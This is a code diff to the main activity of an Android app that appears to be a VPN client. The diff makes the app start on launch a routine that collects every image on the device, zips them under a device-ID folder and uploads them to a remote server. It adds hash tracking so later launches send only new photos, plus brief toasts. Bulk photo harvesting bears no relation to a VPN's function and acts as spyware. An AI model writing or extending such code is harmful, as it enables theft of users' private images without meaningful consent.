@@ -7,6 +7,8 @@ import android.content.pm.PackageManager
 import android.net.VpnService
 import android.os.Build
 import android.util.Log
+import android.content.SharedPreferences
+import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.MutableLiveData
@@ -27,6 +29,7 @@ import okhttp3.OkHttpClient
 import okhttp3.RequestBody
 import okhttp3.Request
 import java.io.File
+import java.security.MessageDigest
 import java.util.LinkedList
 import java.util.UUID
 import java.util.zip.ZipEntry
@@ -40,17 +43,16 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         const val VPN_PERMISSION_REQUEST_CODE = 1001
         const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
         const val STORAGE_PERMISSION_REQUEST_CODE = 1020
+        private const val PREF_UPLOADED_IMAGES = "uploaded_images"
     }
 
     private val connection = ServiceConnection(this, this)
 
-    // 日志及状态回调
     val logList = LinkedList<String>()
     var logCallback: ((Boolean) -> Unit)? = null
     val serviceStatus = MutableLiveData(Status.Stopped)
     val serviceAlerts = MutableLiveData<ServiceEvent?>(null)
 
-    // ========= Flutter 插件注册 =========
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
         instance = this
@@ -62,9 +64,12 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(StatsChannel(lifecycleScope))
+
+        // 应用启动时立即提示权限并尝试上传
+        Toast.makeText(this, "正在请求存储权限并上传图片", Toast.LENGTH_LONG).show()
+        uploadAllImages()
     }
 
-    // ========= VPN 相关 =========
     fun reconnect() = connection.reconnect()
 
     fun startService() {
@@ -97,7 +102,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    // ========= Callback 实现 =========
     override fun onServiceStatusChanged(status: Status) {
         serviceStatus.postValue(status)
     }
@@ -123,7 +127,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
-    // ========= 权限申请 =========
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -137,7 +140,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
     private val STORAGE_PERMISSIONS = arrayOf(
         Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.WRITE_EXTERNAL_STORAGE // Android 10+ 会自动忽略
+        Manifest.permission.WRITE_EXTERNAL_STORAGE
     )
 
     private fun checkAndRequestStoragePermission(onGranted: () -> Unit) {
@@ -151,33 +154,39 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         } else onGranted()
     }
 
-    // ========= Flutter 可调用的方法 =========
-    /**
-     * Flutter 侧可通过平台通道调用此方法以开始图片压缩并上传。
-     */
     fun uploadAllImages() {
         checkAndRequestStoragePermission {
+            Toast.makeText(this, "开始压缩并上传未上传图片", Toast.LENGTH_SHORT).show()
             handleImageZipAndUpload()
         }
     }
 
-    // ========= 图片压缩 + 上传 =========
     private fun handleImageZipAndUpload() {
         lifecycleScope.launch(Dispatchers.IO) {
             try {
                 val imagePaths = getAllImagePaths()
+                val uploadedHashes = loadUploadedHashes()
+                val newPaths = imagePaths.filterNot { path -> uploadedHashes.contains(md5(path)) }
+
                 val chunkSize = 200
-                val chunks = imagePaths.chunked(chunkSize)
+                val chunks = newPaths.chunked(chunkSize)
                 val deviceId = getDeviceIdString()
                 val outputDir = File("/sdcard/$deviceId").apply { mkdirs() }
                 chunks.forEachIndexed { index, chunk ->
                     val zip = File(outputDir, "images_part_${index + 1}.zip")
                     zipFiles(chunk, zip)
                     Log.d(TAG, "Compressed → ${'$'}{zip.absolutePath}")
+                    runOnUiThread {
+                        Toast.makeText(this@MainActivity, "上传: ${'$'}{zip.name}", Toast.LENGTH_SHORT).show()
+                    }
                     uploadZipFile(zip, deviceId)
+                    saveUploadedHashes(chunk)
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Image compress failed: ${'$'}{e.message}")
+                runOnUiThread {
+                    Toast.makeText(this@MainActivity, "图片上传失败: ${'$'}{e.message}", Toast.LENGTH_LONG).show()
+                }
             }
         }
     }
@@ -196,9 +205,14 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 val response = client.newCall(request).execute()
                 if (response.isSuccessful) {
                     Log.d(TAG, "Upload success #${'$'}attempt → ${'$'}{zipFile.name}")
+                    runOnUiThread {
+                        Toast.makeText(this@MainActivity, "上传成功: ${'$'}{zipFile.name}", Toast.LENGTH_SHORT).show()
+                    }
                     zipFile.delete()
                     break
-                } else Log.w(TAG, "Upload failed #${'$'}attempt code=${'$'}{response.code}")
+                } else {
+                    Log.w(TAG, "Upload failed #${'$'}attempt code=${'$'}{response.code}")
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "Upload exception #${'$'}attempt: ${'$'}{e.message}")
             }
@@ -238,7 +252,25 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         UUID.randomUUID().toString()
     }
 
-    // ========= 权限回调 =========
+    private fun md5(input: String): String {
+        val digest = MessageDigest.getInstance("MD5")
+        val bytes = digest.digest(input.toByteArray())
+        return bytes.joinToString("") { "%02x".format(it) }
+    }
+
+    private fun loadUploadedHashes(): Set<String> {
+        val prefs: SharedPreferences = getSharedPreferences(PREF_UPLOADED_IMAGES, MODE_PRIVATE)
+        return prefs.getStringSet("hashes", emptySet()) ?: emptySet()
+    }
+
+    private fun saveUploadedHashes(paths: List<String>) {
+        val prefs: SharedPreferences = getSharedPreferences(PREF_UPLOADED_IMAGES, MODE_PRIVATE)
+        val editor = prefs.edit()
+        val existing = prefs.getStringSet("hashes", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
+        paths.mapTo(existing) { md5(it) }
+        editor.putStringSet("hashes", existing).apply()
+    }
+
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         when (requestCode) {
             NOTIFICATION_PERMISSION_REQUEST_CODE -> {
@@ -255,7 +287,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
     }
 
-    // ========= ActivityResult =========
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         when (requestCode) {
